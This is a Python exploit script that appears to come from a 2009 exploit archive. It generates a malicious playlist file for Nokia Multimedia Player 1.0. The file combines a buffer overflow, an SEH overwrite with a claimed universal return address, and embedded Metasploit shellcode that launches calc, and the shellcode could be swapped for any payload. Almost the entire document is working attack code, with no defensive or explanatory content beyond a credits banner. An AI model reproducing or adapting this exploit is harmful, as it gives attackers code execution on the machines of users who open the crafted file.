#usage: exploit.py
print "**************************************************************************"
print " Nokia Multimedia Player 1.0 (playlist) Universal Seh Overwrite Exploit\n"
print " Founder : 0in"
print " Exploited by : His0k4"
print " Tested on: Windows XP Pro SP2 Fr\n"
print " Greetings to:"
print " All friends & muslims HaCkers(dz)\n"
print "**************************************************************************"
         	

			
buff = "\x41" * 1880

next_seh = "\xEB\x06\x41\x41"

nops = "\x90"*19

seh = "\x0E\xD2\x8E\x01" #yes universal :D




# win32_exec -  EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com
shellcode = (
	"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
	"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x48\x49\x51\x5a\x6a\x67"
	"\x58\x50\x30\x42\x30\x42\x6b\x42\x41\x77\x41\x42\x32\x42\x41\x32"
	"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x6b\x59\x79\x6c\x6b"
	"\x58\x37\x34\x53\x30\x35\x50\x53\x30\x6c\x4b\x41\x55\x47\x4c\x6c"
	"\x4b\x51\x6c\x63\x35\x54\x38\x77\x71\x7a\x4f\x6e\x6b\x70\x4f\x74"
	"\x58\x4e\x6b\x43\x6f\x37\x50\x43\x31\x5a\x4b\x47\x39\x4e\x6b\x37"
	"\x44\x6c\x4b\x45\x51\x58\x6e\x37\x41\x6b\x70\x6c\x59\x6c\x6c\x4f"
	"\x74\x6f\x30\x62\x54\x47\x77\x6b\x71\x59\x5a\x76\x6d\x74\x41\x6b"
	"\x72\x58\x6b\x69\x64\x65\x6b\x41\x44\x47\x54\x34\x44\x44\x35\x38"
	"\x65\x6e\x6b\x33\x6f\x31\x34\x37\x71\x6a\x4b\x51\x76\x6e\x6b\x44"
	"\x4c\x42\x6b\x6e\x6b\x43\x6f\x57\x6c\x55\x51\x6a\x4b\x4c\x4b\x47"
	"\x6c\x4e\x6b\x75\x51\x4a\x4b\x4e\x69\x31\x4c\x66\x44\x37\x74\x4f"
	"\x33\x55\x61\x4f\x30\x30\x64\x6e\x6b\x77\x30\x36\x50\x4e\x65\x39"
	"\x50\x31\x68\x64\x4c\x6c\x4b\x73\x70\x36\x6c\x6e\x6b\x30\x70\x37"
	"\x6c\x6c\x6d\x4e\x6b\x45\x38\x45\x58\x58\x6b\x73\x39\x6e\x6b\x4b"
	"\x30\x4e\x50\x75\x50\x73\x30\x63\x30\x6c\x4b\x45\x38\x65\x6c\x31"
	"\x4f\x30\x31\x4c\x36\x75\x30\x32\x76\x6d\x59\x59\x68\x6c\x43\x4b"
	"\x70\x41\x6b\x46\x30\x45\x38\x48\x70\x4e\x6a\x65\x54\x43\x6f\x71"
	"\x78\x4f\x68\x59\x6e\x4c\x4a\x76\x6e\x52\x77\x6b\x4f\x6b\x57\x72"
	"\x43\x53\x51\x30\x6c\x52\x43\x77\x70\x67"
    )

	
exploit = buff + next_seh + seh + nops + shellcode
	
try:
    out_file = open("nokia.npl",'w')
    out_file.write(exploit)
    out_file.close()
    print "Exploit file created!\n"
except:
    print "Error"

# milw0rm.com [2009-03-09]
